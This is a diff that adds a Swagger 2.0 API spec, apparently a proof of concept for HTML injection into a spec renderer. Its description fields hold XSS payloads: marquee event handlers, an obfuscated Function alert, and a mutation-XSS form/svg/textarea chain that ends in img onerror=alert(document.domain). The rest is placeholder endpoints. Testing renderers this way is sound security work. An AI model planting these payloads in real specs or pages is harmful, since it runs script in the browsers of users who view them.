@@ -1,0 +1,62 @@
+swagger: '2.0'
+info:
+  title: HTML INJECTION FOR POC
+  description: |
+    <marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
+    <marquee onstart=alert(1)>
+    <marquee loop=1 width=0 onfinish=alert(2)>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1></form>
+
+  version: production
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  "/abir":
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - somettext
+      operationId: findAccounts
+      summary: this is example text
+  "/malformed_by_abir":
+    delete:
+      parameters:
+      - description: |
+          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="<h1>hide here</h1>"></form>
+
+        format: int64
+        in: path
+        name: id
+        required: true
+        type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - abir
+      operationId: abir
+      summary: abir
+    get:
+      parameters:
+      - description: this is example text
+        format: int64
+        in: path
+        name: id
+        required: true
+        type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - abir
+      operationId: some_operation
+      summary: this is example text
